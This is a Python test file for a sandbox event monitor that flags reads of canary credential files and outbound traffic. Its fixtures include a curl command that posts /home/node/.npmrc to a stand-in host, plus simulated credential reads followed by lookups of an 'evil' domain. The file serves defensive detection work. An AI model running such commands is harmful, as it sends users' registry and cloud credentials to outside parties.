import json

from airlock.events import WatchTranslator

ALLOW = ("registry.npmjs.org",)


def lines(*recs) -> str:
    return "\n".join(json.dumps({"ts": 1, **r}) for r in recs)


def kinds(out):
    return [k for k, _, _ in out]


def test_shell_stealer_is_seen_and_exfil_inferred():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines(
        {"ev": "watch_ready", "what": "watcher"},
        {"ev": "exec", "path": "/usr/bin/curl", "pid": 486, "cmd": "curl -X POST --data-binary @/home/node/.npmrc https://x.invalid/", "exe": "/usr/bin/curl", "uid": 1000},
        {"ev": "open", "path": "/home/node/.npmrc", "pid": 486, "exe": "/usr/bin/curl", "uid": 1000},
        {"ev": "dns", "name": "x.invalid", "pid": 486, "exe": "/usr/bin/curl", "uid": 1000},
        {"ev": "dns", "name": "x.invalid", "pid": 486, "exe": "/usr/bin/curl", "uid": 1000},  # AAAA twin
    ))
    assert kinds(out) == ["process_spawn", "canary_read", "egress_blocked", "canary_exfil"]
    exfil = out[-1]
    assert exfil[2]["inferred"] and exfil[2]["host"] == "x.invalid" and exfil[2]["scope"] == "same process"


def test_root_and_npm_activity_is_ignored():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines(
        {"ev": "open", "path": "/root/.npmrc", "pid": 10, "exe": "/usr/bin/cat", "uid": 0},
        {"ev": "open", "path": "/home/node/.npmrc", "pid": 11, "cmd": "node /usr/local/lib/node_modules/npm/bin/npm-cli.js install x", "uid": 1000},
        {"ev": "dns", "name": "registry.npmjs.org", "pid": 12, "exe": "/usr/bin/curl", "uid": 1000},
    ))
    assert out == []


def test_connect_allowed_only_when_ip_resolved_from_allowlisted_name():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines(
        {"ev": "dns_answer", "name": "registry.npmjs.org", "ips": ["104.16.1.1"]},
        {"ev": "connect", "dest": "203.0.113.7:8080", "state": "ESTABLISHED", "pid": 7, "exe": "/usr/bin/curl", "uid": 1000},
        {"ev": "connect", "dest": "104.16.1.1:443", "state": "ESTABLISHED", "pid": 8, "exe": "/usr/bin/curl", "uid": 1000},
    ))
    assert kinds(out) == ["egress_blocked", "egress_allowed"]
    assert "raw IP" in out[0][1] and "registry.npmjs.org" in out[1][1]


def test_exfil_inferred_across_siblings_of_one_script():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines(
        {"ev": "open", "path": "/home/node/.npmrc", "pid": 540, "ppid": 539, "exe": "/usr/bin/cat", "uid": 1000},
        {"ev": "dns", "name": "telemetry.evil.invalid", "pid": 542, "ppid": 539, "exe": "/usr/bin/curl", "uid": 1000},
    ))
    assert kinds(out) == ["canary_read", "egress_blocked", "canary_exfil"]
    assert out[-1][2]["scope"] == "same parent process 539"


def test_canary_read_without_egress_is_not_exfil():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines({"ev": "open", "path": "/home/node/.aws/credentials", "pid": 5, "exe": "/usr/bin/python3.11", "uid": 1000}))
    assert kinds(out) == ["canary_read"] and "python3.11 read canary" in out[0][1]


def test_unattributed_refusals_are_still_reported():
    out = WatchTranslator(ALLOW).feed(lines({"ev": "connect_refused", "count": 2}))
    assert kinds(out) == ["egress_blocked"] and "2 outbound connection attempts refused" in out[0][1]
